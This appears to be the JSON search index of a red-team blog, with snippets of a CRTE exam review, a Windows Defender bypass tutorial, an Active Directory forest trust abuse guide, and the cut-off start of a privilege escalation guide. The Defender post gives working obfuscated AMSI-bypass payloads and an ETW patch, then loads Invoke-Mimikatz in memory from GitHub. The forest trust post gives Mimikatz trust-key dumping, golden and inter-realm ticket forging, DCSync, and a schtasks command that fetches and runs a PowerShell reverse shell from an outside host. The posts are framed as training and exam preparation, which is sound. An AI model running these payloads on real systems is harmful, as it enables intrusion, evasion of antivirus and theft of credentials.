[ { "title": "CRTE Exam Review", "url": "/posts/CRTE-Exam-Review/", "categories": "Red-Teaming-Exams, CRTE-Review", "tags": "active-directory, CRTE-exam", "date": "2023-07-15 07:23:00 +0530", "snippet": "IntroductionI am thrilled to announce that I have successfully passed the CRTE (Certified Red Team Expert) exam from Altered Security, and I am excited to share my journey and experience with all of you. This certification marks a significant milestone in my career as a cybersecurity professional, further building upon my earlier achievements of attaining the CRTP (Certified Red Team Professional) and the CRTO (Certified Red Team Operator) certifications.Throughout my preparation and examination process, I encountered numerous challenges, gained invaluable insights, and developed a deeper understanding of the red teaming discipline. This blog aims to provide a comprehensive account of my experiences, shedding light on the preparation strategies, lab reviews, and the exam itself. Moreover, I will share tips and techniques that I found helpful in conquering the CRTE exam, offering guidance to those who aspire to follow a similar path.PreparationWhen preparing for the CRTE exam, it‚Äôs essential to establish a strong foundation in red teaming concepts and techniques. Red teaming involves simulating real-world attacks to identify vulnerabilities within an organization‚Äôs security infrastructure. To ensure a smoother transition into CRTE, I recommend completing the CRTP (Certified Red Team Professional) certification first.The CRTP certification covers a wide range of essential topics that serve as the building blocks for CRTE. It delves into areas such as Active Directory (AD) enumeration, trust mapping, domain privilege escalation, Kerberos-based attacks, SQL server trusts, defences, and bypasses of defences. By acquiring a solid understanding of these fundamental concepts through the CRTP, you will be better equipped to tackle the more advanced content in CRTE.Additionally, I had the opportunity to complete the CRTO (Certified Red Team Operator) certification, which focuses on conducting red team exams using the C2 framework ‚ÄúCobalt Strike‚Äù. While I wouldn‚Äôt consider the CRTO a prerequisite for CRTE, it gave me valuable hands-on experience and a deeper understanding of red teaming methodologies. The CRTO exam-based approach, combined with using Cobalt Strike, enhanced my practical skills and complemented the theoretical knowledge gained from the CRTP.Engaging in practical exercises related to Active Directory was beneficial for extra preparation. HackTheBox : Easy-Medium Level Boxes HackTheBox ProLabs : Rastalabs or Offshore TCM Security : PEH CourseCRTE LabFor the lab portion of the CRTE certification, you can choose between ‚ÄúOn Demand‚Äù and ‚ÄúOnline Bootcamp.‚ÄùBootcampThe ‚ÄúBootcamp‚Äù option, is a 4-day workshop conducted weekly, with each session lasting approximately 3.5 hours. The course instructor covers the relevant concepts in these live sessions and demonstrates various objectives. The ‚ÄúBootcamp‚Äù option is particularly beneficial for those who prefer a more guided approach and would like additional support throughout the lab exercises. However, having already solved Hack The Box Pro Labs, I felt confident that I could tackle the labs independently. Thus, I chose the ‚ÄúOn Demand‚Äù option to proceed with my CRTE lab experience.On DemandThe ‚ÄúOn Demand‚Äù option grants you access to the lab environment for your choice, ranging from 30 to 90 days. Priced at $299 for the 30-day access, this option includes all the necessary tools and a lab PDF that is solved using PowerShell. Additionally, the lab is solved using the C2 framework ‚ÄúCovenant‚Äù. In the ‚ÄúOn Demand‚Äù option, students are expected to work independently on the lab challenges. However, if you encounter any difficulties, you can seek assistance by contacting the support team via email or by engaging with fellow students in the dedicated Discord group.I opted for the ‚ÄúOn Demand‚Äù option and immediately began my lab journey after purchasing it on June 29th. The lab consists of 22 machines distributed across 8 forests, encompassing advanced attack scenarios. These scenarios cover various topics, including abuse of Kerberos Delegation, PAM Trust Abuse, LAPS, Dimond Tickets, MSSQL Abuse, Certificate Services, Shadow Credentials, and more. Additionally, the lab contains a total of 60 flags to discover.Remarkably, I completed all the flags within 48 hours, spanning 4 days. To ensure I captured all the vital details, I diligently took comprehensive notes using Obsidian, documenting the attack techniques I utilized and the corresponding commands. In the end, you also have the option to tweet about the lab completion.Exam ExperienceExam SetupThe CRTE exam offers the flexibility of an on-demand start, eliminating the need for advanced scheduling. The exam setup process typically takes around 10-15 minutes. Upon commencement, you are provided an additional hour of lab access, extending the total exam lab time to 48 hours plus 1 hour. Following the completion of the exam, you are granted an extra 48 hours to prepare and submit a comprehensive report. This report should include meticulous details such as screenshots and tool references for each attack that exploits specific machines.To successfully pass the CRTE exam, you must demonstrate your proficiency by solving at least 4 out of 5 machines. Alongside your successful exploitation, delivering a high-quality report encompassing key elements such as thorough enumeration, step-by-step exploitation methodology, post-exploitation activities, and suggested mitigations is crucial.By adhering to these requirements and presenting a well-documented report, you can effectively showcase your understanding of the exam objectives and secure a successful outcome in the CRTE certification exam.Exam JourneyDuring my CRTE exam journey, I commenced the examination on July 6th around 12:30 PM. The exam would end in 48 hours and would have an extra 48 hours to submit the reort.The initial compromise of the first machine proved to be relatively straightforward, requiring adherence to the basic attack methodology that eventually led me to discover something intriguing. I could attain a reverse shell on the target system by leveraging this discovery.However, the second machine presented a more challenging task, demanding additional research beyond what was covered in the course materials. Diligent exploration and in-depth investigation on various abuse techniques were necessary to overcome this obstacle successfully.Fortunately, the third machine posed fewer difficulties, with the attack path becoming quite apparent during the enumeration process. This clarity facilitated a relatively swift compromise.On the other hand, the fourth machine initially posed a minor setback as I mistakenly assumed a particular attack vector without conducting a thorough enumeration. Once I corrected this oversight and performed comprehensive enumeration, the correct attack path became evident, leading to a successful compromise.Lastly, the fifth machine followed a similar pattern of relative ease, with the attack path visible, making it more straightforward to exploit and compromise.I completed the CRTE exam in just 17 hours and submitted the accompanying report within 24 hours.Although I admittedly spent some time exploring non-essential aspects, those who approach the exam more directly can reasonably expect to finish within 6 to 9 hours. By staying focused and minimizing distractions, candidates can optimize their exam experience and achieve efficient results.Exam ReviewReflecting on my exam experience, I can‚Äôt help but recall a popular meme that perfectly encapsulates it all. While the CRTE course delved into numerous advanced attack vectors, it was interesting that those specific vectors weren‚Äôt prominently featured in the exam. It‚Äôs important to emphasize that this doesn‚Äôt necessarily imply that the exam was more challenging or straightforward. Instead, what truly mattered was a comprehensive understanding of the methodology and a strategic approach when dealing with an Active Directory environment.A solid grasp of the methodology and navigating an Active Directory environment proved crucial during the exam. By applying this knowledge effectively, the exam unfolded smoothly. Moreover, the exam‚Äôs success relied on conducting proper research, delving into the necessary techniques, and employing sound practices. Armed with these preparations, compromising each machine became an achievable feat.Exam Tips Develop a Methodology: Build a proper methodology for attacking an AD environment, encompassing the enumeration, exploitation, and post-exploitation phases. It is crucial to mention the mitigations for each step exploited in your report, demonstrating a comprehensive understanding of defensive measures. Focus on Enumeration: Prioritize thorough enumeration as it is the key to uncovering crucial information about the target environment. Invest ample time in gathering details about users, groups, privileges, and potential vulnerabilities. Utilize BloodHound: Familiarize yourself with the powerful tool BloodHound, which provides valuable insights into AD environments. If needed, employ manual enumeration using PowerShell to gather additional information. Maintain a List of Attacks and Techniques: Keep a comprehensive list of enumeration techniques and potential attacks. If BloodHound or initial enumeration doesn‚Äôt yield desired results, refer to your list to explore alternative attack paths. Correlate User and Credential Information: Take note of all users and credentials you discover during the exam. Correlating this information may uncover valuable hints or clues for further exploitation and privilege escalation. Document Mitigations: Pay attention to potential mitigations for the vulnerabilities and attack vectors you encounter. Include these mitigations in your report to showcase your understanding of defensive measures and provide a thorough analysis. Take Breaks and Manage Stress: Remember to take regular breaks, eat well, and rest during the exam. Managing stress levels and maintaining a clear mindset will help enhance your focus and overall performance. Feel free to check out my cheat sheet for CRTE exam on my github CRTE-NOTES. This cheat sheet includes additional insights and strategies to help you prepare effectively for the exam.ConclusionIn conclusion, undertaking the CRTE lab and exam proved to be a rewarding experience. The lab environment provided an excellent platform for practical application, allowing me to exercise the attack vectors covered in the course and explore various chained attacks. The support team demonstrated exceptional responsiveness throughout the lab, promptly addressing any lab-related issues and assisting whenever I encountered challenges.Transitioning to the exam phase, the difficulty level was relatively moderate. I could successfully navigate the exam with a diligent research approach and well-established methodology. The exam tested not only my technical knowledge but also my ability to apply that knowledge in a methodical manner.After eagerly awaiting the results, I received the outcome via email after a week, and to my delight, I learned that I had passed the exam!If you find my articles interesting, you can buy me a coffee" }, { "title": "Bypassing Windows Defender", "url": "/posts/Bypassing-Windows-Defender/", "categories": "Red-Teaming, Defender-bypass", "tags": "active-directory, windows, amsi-bypass, etw-bypass", "date": "2023-05-14 20:00:00 +0530", "snippet": "IntroductionGreetings, everyone üëã. In this brief article, I will outline a manual obfuscation technique for bypassing Windows Defender. Specifically, I will cover how to patch the Antimalware Scan Interface and disable Event Tracing for Windows to evade detection. Additionally, I will demonstrate how to combine both methods for maximum effectiveness and provide guidance on using this approach. Throughout the article, I will use AmsiTrigger and Invoke-obfuscation. These tools will help to identify the malicious scripts and help obfuscate them.Bypassing AV Signatures PowerShellWindows Defender Antimalware Scan Interface (AMSI) is a security feature that is built into Windows 10 and Windows Server 2016 and later versions. AMSI is designed to provide enhanced malware protection by allowing antivirus and other security solutions to scan script-based attacks and other suspicious code before they execute on a system.By disabling or AMSI, attackers can download malicious scripts in memory on the systems. Original Payload for AMSI bypass [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) Methodology - Manual Scan using AMSITrigger Modify the detected code snippet Base64 Hex Concat Reverse String Rescan using AMSITrigger or Download a test ps1 script in memory Repeat the steps 2 &amp;amp; 3 till we get a result as ‚ÄúAMSI_RESULT_NOT_DETECTED‚Äù or ‚ÄúBlank‚ÄùUnderstanding the commandThis command is used to modify the behavior of the Anti-Malware Scan Interface (AMSI) in PowerShell. Specifically, it sets a private, static field within the System.Management.Automation.AmsiUtils class called ‚ÄúamsiInitFailed‚Äù to true, which indicates that the initialization of AMSI has failed.Here is a breakdown of the command and what each part does: [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;): This first part of the command uses the [Ref] type accelerator to get a reference to the System.Management.Automation assembly and then uses the GetType() method to get a reference to the System.Management.Automation.AmsiUtils class. System.Management.Automation.AmsiUtils is a part of the PowerShell scripting language and is used to interact with the Anti-Malware Scan Interface (AMSI) on Windows operating systems. AMSI is a security feature that allows software to integrate with antivirus and other security products to scan and detect malicious content in scripts and other files. While System.Management.Automation.AmsiUtils itself is not inherently malicious, it can be flagged as such if it is being used in a context that appears suspicious to antivirus or other security software. For example, malware authors may use PowerShell scripts that leverage AMSI to bypass traditional antivirus detection and execute malicious code on a system. Thus, System.Management.Automation.AmsiUtils may be flagged as malicious if it is being used in a context that appears to be part of a malware attack or if it is being used in a way that violates security policies on a system. .GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;): This part of the command uses the GetField() method to get a reference to the private, static field within the System.Management.Automation.AmsiUtils class called &quot;amsiInitFailed&quot;. The &#39;NonPublic,Static&#39; argument specifies that the method should retrieve a non-public and static field. .SetValue($null,$true): Finally, this part of the command uses the SetValue() method to set the value of the &quot;amsiInitFailed&quot; field to true. The $null argument specifies that we are not setting the value on an instance of the object, and the $true argument is the new value we are setting the field to.The reason for setting &quot;amsiInitFailed&quot; to true is to bypass AMSI detection, which may be used by antivirus or other security software to detect and block potentially malicious PowerShell commands or scripts. By indicating that the initialization of AMSI has failed, this command prevents AMSI from running and potentially interfering with the execution of PowerShell commands or scripts. It is worth noting, however, that bypassing AMSI can also make it easier for malicious actors to execute code on a system undetected, so caution should be exercised when using this command in practice.Running the commandLets open Powershell and execute the original payload to patch AMSI and check the result.PS:\\&amp;gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) As we can see, Windows has identified the command as malicious and blocked it from being executed. Now we need to identify what part of the payload is getting detected by Defender and triggering it to be marked as malicious.AMSI Trigger With the help of AMSITrigger.exe, we can identify the malicious string in the payload.PS C:\\AMSITrigger&amp;gt; .\\AmsiTrigger_x64.exe We can save our payload in a .ps1 file, and with the -i flag, we can supply the malicious ps1 filePS C:\\AMSITrigger&amp;gt; .\\AmsiTrigger_x64.exe -i test.ps1From the output results we can see that it flagged two strings as malicious ‚ÄúA m s i U t i l s‚Äù ‚Äúa m s i I n i t F a i l e d‚ÄùPatching AMSIAfter analyzing the strings that caused Windows Defender to block our script, we can now take steps to bypass this security mechanism. Several techniques can be used to evade detection, with one of the simplest and most effective being to encode or encrypt the payload.We can do it in the following ways Base64 Encoding Hex Encoding Reversing The String Concatenation Now lets try to modify our original payload using just Base64 encoding.Base64 EncodingBase64 Encoding is a widely used encoding technique that converts binary data into a string of ASCII characters. This method is easy to implement and can be decoded with simple tools. A simple Base64 encoding and decoding snippet in PowerShell looks like this :# Encoding PayloadPS:\\&amp;gt; $Text = &#39;Hello World&#39;;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText# Decoding PaylaodPS:\\&amp;gt; $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;SABlAGwAbABvACAAVwBvAHIAbABkAA==&#39;))) Now we can do the same for AmsiUtils and amsiInitFailedPS:\\&amp;gt; $Text = &#39;AmsiUtils&#39;;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText Windows Defender could still detect AmsiUtils encoded in base64. We can divide this into two pieces and concat them together to avoid getting detected.# Encoding PayloadPS:\\&amp;gt; $Text = &#39;Amsi&#39;;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedTextPS:\\&amp;gt; $Text = &#39;Utils&#39;;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText# Decoding PaylaodPS:\\&amp;gt; $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;QQBtAHMAaQA=&#39;)))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;VQB0AGkAbABzAA==&#39;))) We can see this way we have encoded AmsiUtils without triggering Defender Lets try the same for amsiInitFailed by splitting it into 3 parts amsi Init Failed # Encoding PayloadPS:\\&amp;gt; $Text = &#39;amsi&#39;;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedTextPS:\\&amp;gt; $Text = &#39;Init&#39;;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedTextPS:\\&amp;gt; $Text = &#39;Failed&#39;;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText# Decoding PaylaodPS:\\&amp;gt; $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;YQBtAHMAaQA=&#39;)) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String(&#39;SQBuAGkAdAA=&#39;)))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;RgBhAGkAbABlAGQA&#39;)))) As we can see, we have encoded amsiInitFailed also without triggering Defender.Final PayloadNow that we crafted the final payload to Patch AMSI, let us look back at the original AMSI bypass code.PS:\\&amp;gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) All we need to do now is replace AmsiUtils and amsiInitFailed with the base64 encoded payload and concat the rest of the string.PS:\\&amp;gt; [Ref].Assembly.GetType($(&#39;System.Management.Automation.&#39;)+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;QQBtAHMAaQA=&#39;)))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;VQB0AGkAbABzAA==&#39;)))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;YQBtAHMAaQA=&#39;)) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String(&#39;SQBuAGkAdAA=&#39;)))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;RgBhAGkAbABlAGQA&#39;)))),$(&#39;NonPublic,Static&#39;)).SetValue($null,$true) For confirmation, we can download and execute Mimikatz.ps1 in the memory and check if its triggering Defender.PS:\\&amp;gt; IEX(iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -UseBasicParsing)As you can see, we successfully encoded the AMSI bypass payload in base64. Below I will give a demonstration on how to encode it in hex and use techniques like reverse string and concatenationConcatenationAn easy was of bypassing ‚ÄúA m s i U t i l s‚Äù is by simply splitting it into two words and adding them together.PS:\\&amp;gt; &#39;AmsiUtils&#39;PS:\\&amp;gt; &#39;Amsi&#39; + &#39;Utils&#39;Hex EncodingA simple Hex encoding and decoding snippet in PowerShell looks like this :# Encoding PayloadPS:\\&amp;gt; &quot;Hello World&quot; | Format-Hex# Decoding PayloadPS:\\&amp;gt; $r = &#39;48 65 6C 6C 6F 20 57 6F 72 6C 64&#39;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_} PS C:\\&amp;gt; $sReverse StringThe last technique is by reversing the string for obfuscating the payload.# Encoding PayloadPS:\\&amp;gt; (([regex]::Matches(&quot;testing payload&quot;,&#39;.&#39;,&#39;RightToLeft&#39;) | foreach {$_.value}) -join &#39;&#39;)# Decoding PayloadPS:\\&amp;gt; (([regex]::Matches(&quot;daolyap gnitset&quot;,&#39;.&#39;,&#39;RightToLeft&#39;) | foreach {$_.value}) -join &#39;&#39;)Final Payload - 2We can also combine these techniques to create a more powerful and effective payload that can evade detection by Windows Defender. Using a combination of Base64 Encoding, Hex Encoding, Reversing The String, and Concatenation, we can create a highly obfuscated payload to bypass Windows Defender.PS:\\&amp;gt; $w = &#39;System.Manag&#39;;$r = &#39;65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e&#39;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_};$c = &#39;Amsi&#39;+&#39;Utils&#39;;$assembly = [Ref].Assembly.GetType((&#39;{0}{1}{2}&#39; -f $w,$s,$c));$n = $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;YQBtAA==&#39;)));$b = &#39;siIn&#39;;$k = (([regex]::Matches(&quot;deliaFti&quot;,&#39;.&#39;,&#39;RightToLeft&#39;) | foreach {$_.value}) -join &#39;&#39;);$field = $assembly.GetField((&#39;{0}{1}{2}&#39; -f $n,$b,$k),&#39;NonPublic,Static&#39;);$field.SetValue($null,$true)Patching Event Tracing for WindowsEvent Tracing for Windows (ETW) is a powerful logging and tracing mechanism in the Windows operating system that allows developers, administrators, and analysts to monitor and diagnose system events in real time. It collects and analyses diagnostic and performance data from applications and services running on Windows. ETW records events generated by the operating system and applications, including information on processes, threads, disk I/O, network activity, and more.By disabling or manipulating ETW, attackers can prevent security tools from logging their actions or tracking their movement within a system. Original Payload to patch ETW [Reflection.Assembly]::LoadWithPartialName(&#39;System.Core&#39;).GetType(&#39;System.Diagnostics.Eventing.EventProvider&#39;).GetField(&#39;m_enabled&#39;,&#39;NonPublic,Instance&#39;).SetValue([Ref].Assembly.GetType(&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;).GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;).GetValue($null),0) Understanding the commandThis command is used to modify the behavior of the Event Tracing for Windows(ETW) in PowerShell. Specifically, it sets a private, static field within the System.Management.Automation.Tracing.PSEtwLogProvider class called &quot;m_enabled&quot; to true, 0 indicates that the initialization of ETW is disabled.Here is a breakdown of the command and what each part does: [Reflection.Assembly]::LoadWithPartialName(&#39;System.Core&#39;) loads the System.Core assembly into memory. .GetType(&#39;System.Diagnostics.Eventing.EventProvider&#39;) retrieves the EventProvider type from the loaded assembly. .GetField(&#39;m_enabled&#39;,&#39;NonPublic,Instance&#39;) retrieves the m_enabled field of the EventProvider type, which determines whether event tracing is enabled for that provider. .SetValue([Ref].Assembly.GetType(&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;).GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;).GetValue($null),0) sets the m_enabled field of the PowerShell ETW provider to 0 (disabled). This prevents PowerShell from logging events to the Windows Event Log or other ETW consumers.Patching ETWWe have already learned how to patch PowerShell scripts manually. I will explain how to obfuscate Powershell using Invoke-Obfuscation for this example. I already have this setup on my Commando-VM. First thing is that we can launch Invoke-Obfuscation We can set our payload and use AES encryption to encrypt our payload.Invoke-Obfuscation&amp;gt; SET SCRIPT BLOCK [Reflection.Assembly]::LoadWithPartialName(&#39;System.Core&#39;).GetType(&#39;System.Diagnostics.Eventing.EventProvider&#39;).GetField(&#39;m_enabled&#39;,&#39;NonPublic,Instance&#39;).SetValue([Ref].Assembly.GetType(&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;).GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;).GetValue($null),0)Invoke-Obfuscation&amp;gt; ENCODINGInvoke-Obfuscation&amp;gt; ENCODING\\5 The encrypted payload will be visible at the end of the screen. Now we can execute the payload. Before doing that, we need to understand why we have encrypted the payload and what the payload does. First, lets directly execute the payload. As we can see that Defender has detected our encrypted payload, this is because it‚Äôs encryption which will be decrypted and get executed. Hence will help in bypassing Static analysis only. We can better understand if we execute the command without executing it. To circumvent this security measure, we can bypass AMSI and then execute the desired command. It‚Äôs worth noting that while we can bypass AMSI and execute the raw payload to disable ETW, doing so may result in detecting and logging the attack in the PowerShell history file. As a result, it is recommended to use additional techniques such as encoding or obfuscation to evade detection and prevent attack logging.Tools Used AmsiTrigger Invoke-obfuscationIf you find my articles interesting, you can buy me a coffee" }, { "title": "Active Directory - Forest Trust Abuse", "url": "/posts/Active-Diretory-Forest-Trust-Abuse/", "categories": "Red-Teaming, Active-Directory-Forest-Trust-Abuse", "tags": "inter-forest-TGT, ticket-abuse", "date": "2022-04-19 08:38:00 +0530", "snippet": "IntroductionWelcome to my seventh article in the Red Teaming Series (Active Directory Forest Trust Abuse). I hope everyone has gone through the previous articles of this series which go through the basic concepts required up to Domain Privilege Escalation.If not so, you can give it a read from here.This guide explains Active-Directory Forest Trust Abuse mainly by forging an inter-forest TGT. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.I will continue to update this article with new Forest Trust Abuse Methods. Throughout the article, I will use Invoke-Mimikatz in performing the Forest Trust Abuse on a Windows/Active Directory Domain. If any other tools are required, they will be mentioned at the end.The working of the forest trust flowLet‚Äôs break down every step from the above diagram and understand how the trust flows across forests, mainly focusing on external trusts. A forest is a collection of one or more domain trees inside an Active Directory network. Forest trusts between two domain controllers allow users to access resources in each other‚Äôs domains. This can be only possible if the relationship set between them is bi-directional. For example, starlight.US-access.local has an external bi-directional trust to a forest called EU-access.local. Hence a user from the starlight domain can access the resources of EU-access.local.We can map the forest trust with the following command using PowerView.# Map all the trusts of the current forestGet-NetForestDomain | Get-NetDomainTrust # Extract info from the external forest ( Bi-directional )Get-NetForestDomain -Forest &amp;lt;external-forest&amp;gt; -Verbose | Get-NetDomainTrust -NETNow you know what forest trust is and know how to identify it, let‚Äôs begin with the workflow of the trust flow across the forests.1. Client Requests a TGT from DC The privileged user wants to access a specific service from the application server of a different forest. The user sends a timestamp to the DC, which is encrypted and signed with the NTLM hash of the user‚Äôs password. The following is required for the DC to verify if the request is made from the user it claims to be.2. DC sends TGT to Client The DC receives and decrypts the encrypted timestamp. The DC ensures the request comes from the user it claims to be and responds with a Ticket Granting Ticket(TGT) which can grant another ticket. The sent TGT is encrypted and signed off with the NTML hash of the KRBTG, which is a particular account of the DC only used for this purpose. This means the TGT can be only read and opened by the KRBTG.3. and 4. Client receives inter-realm TGT The client receives the TGT, sends it back to the DC and requests a Ticket Granting Service(TGS) service of a different forest. Once the DC discovers the work of TGS is to access the services from a different external forest with a bi-directional trust, it resends an inter-realm TGT to the client.5. and 6. Client receives TGS from external forest The client receives the TGT, sends it back to the DC of the external forest and requests a Ticket Granting Service(TGS). The DC receives the TGS, decrypts it and does the following validation. The only validation it does is whether it can decrypt the TGT or not. If possible, it assumes all the content inside the inter-realm TGT is valid.7. and 8. Client sends service ticket The client connects to the application server and presents the TGS it received from the external DC for its requested service. It decrypts the TGS and then decides whether the user can access the service or not.These are the steps of how a Trust flow across forest works typically. An attacker can abuse the 5th step from the above steps to gain profit. We can forge an inter-realm TGT as an enterprise administrator for the external forest if we have access to the trust keys.In the case of the Domain Trusts, parent-child trusts, we could escalate our privileges to the enterprise administrator using the SID history. But since there is SID filtering in forest and external trusts, we can‚Äôt abuse the SID history part.Trust Key Abuse by rc4 hashMethodology/Steps 1. Dump the trust keys of the inter-forest trusts 2. Note the SID of the current Domain, SID of the target Domain and the rc4_hmac_nt(Trust Key) of the target Domain. 3. We can forge a inter-forest TGT with the proper target and rc4 parameters. Remember to add -519 after the sids parameter to forge privileges as an Enterprise Administrator. 4. Now request a TGS using asktgs.exe 5. Now Inject the TGS in the memory 6. Now we can access all the shared files admin DCInvoke-Mimikatz1. We require the trust key of inter-forest trustInvoke-Mimikatz -Command &#39;&quot;lsadump::trust /patch&quot;&#39;2. Forge the inter-forest TGTInvoke-Mimikatz -Command &#39;&quot;kerberos::golden /user:Administrator /domain:&amp;lt;current-domain&amp;gt; /sid:&amp;lt;current-domain-SID&amp;gt; /sids:&amp;lt;target-domain-SID&amp;gt;-519 /rc4:&amp;lt;target-domain-rc4-hash&amp;gt; /service:krbtgt /target:&amp;lt;target-domain&amp;gt; /ticket:C:\\kekeo_old\\trust_tkt.kirbi&quot;&#39;3. Now create a TGS for a service (CIFS) in the parent domain.\\asktgs.exe C:\\kekeo_old\\trust_tkt.kirbi CIFS/&amp;lt;target-domain-user-dc&amp;gt;4. Present the TGS to the target service.\\kirbikator.exe lsa .\\&amp;lt;file.kirbi&amp;gt;5. Now try to access the target service (CIFS)ls \\\\&amp;lt;target-domain-user-dc&amp;gt;\\C$Trust Key Abuse using RubeusInvoke-Mimikatz1. Create ticket and add it into the memory using asktgs.\\Rubeus.exe /asktgs /ticket:C:\\kekeo_old\\trust_tkt.kirbi /service:cifs/&amp;lt;target-domain-user-dc&amp;gt; /dc:&amp;lt;target-domain-user-dc&amp;gt; /ptt2. List the authenticationsklist3. Now try to access the target service (CIFS)ls \\\\&amp;lt;target-domain-user-dc&amp;gt;\\C$Trust Abuse by krbtgt hashMethodology/Steps 1. Perform a DCSync attack to dump the KRBTGT hash. 2. Dump the trust keys of the inter-forest trusts. 3. Note the SID of the current Domain, SID of the target Domain. 4. We can forge a inter-realm TGT using a Golden Ticket. Remember to add -519 after the sids parameter to forge privileges as an Enterprise Administrator. 5. Now Inject the TGS in the memory 6. We can create a schedule and execute a task to get a shell as enterprise admin.1. Perform a DCSync attack for getting krbtg hash. Execute the below command with DC privilegesInvoke-Mimikatz -Command &#39;&quot;lsadump::dcsyn /domain:&amp;lt;target-domain-SID&amp;gt; /all /cvs&quot;&#39;2. Create the inter-realm TGT using a Golden TicketInvoke-Mimikatz -Command &#39;&quot;kerberos::golden /user:Administrator /domain:&amp;lt;current-domain&amp;gt; /sid:&amp;lt;current-domain-SID&amp;gt; /sids:&amp;lt;target-domain-SID&amp;gt;-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\\krbtgt_tkt.kirbi&quot;&#39;3. Now inject the ticket with MimikatzInvoke-Mimikatz -Command &#39;&quot;kerberos::ptt C:\\krbtgt_tkt.kirbi&quot;&#39;# Now we can also execute wmi commandsgwmi -Class win32_computersystem -ComputerName &amp;lt;target-domain-user-dc&amp;gt;4. Create a schedule to get a shell as NT AUTHORITY\\SYSTEMschtasks /create /S &amp;lt;target-domain-user-dc&amp;gt; /SC Weekly /RU &quot;NT AUTHORITY\\SYSTEM&quot; /TN &quot;pwned&quot; /TR &quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://10.10.x.x/Invoke-PowerShellTcp.ps1&#39;&#39;&#39;)&#39;&quot;schtasks /Run /S &amp;lt;target-domain-user-dc&amp;gt; /TN &quot;pwned&quot;Tools Used Invoke-Mimikatz.ps1 download from here : https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1 asktgs_compiled download from here : https://github.com/NotScortator/asktgs_compiled Rubeus.exe download from here : https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exeIf you find my articles interesting, you can buy me a coffee" }, { "title": "Active Directory - Domain Privilege Escalation", "url": "/posts/Active-Directory-Domain-Priv-Esc/", "categories": "Red-Teaming, Active-Directory-Domain-Privilege-Escalation", "tags": "kerberost, domain-privilege-escalation, AS-REP, Set-SPN, unconstrained-delegation, constrained-delegation, delegation-abuse, dns-admin", "date": "2022-04-14 07:10:00 +0530", "snippet": "IntroductionWelcome to my sixth article in the Red Teaming Series (Active Directory Domain Privilege Escalation). I hope everyone has gone through the previous articles of this series which go through the basic concepts required, high-level Domain enumeration explanation, AD/Windows Local Privilege escalation guide, AD Lateral Movement and Domain Persistence.If not so, you can give it a read from here.This guide explains Active-Directory Domain Privilege Escalation mainly by Kerberos, AS-REPs, Set-SPN, and Kerberos Delegation. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.I will continue to update this article with new Domain Privilege Escalation Methods. Throughout the article, I will use powerview.ps1 and Invoke-Mimikatz in performing the Privilege Escalation on a Windows/Active Directory Domain. If any other tools are required, they will be mentioned at the end.Kerberost Offline cracking of service account passwords. The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack. Service accounts are many times ignored (passwords are rarely changed) and have privileged access. Password hashes of service accounts could be used to create Silver tickets.Methodology/Steps 1. First find all the SPN accounts 2. Select SPN of a domain admin since we doing privilege escalation 3. Set the SPN as the argumentlist value and create a new object ( request a TGS 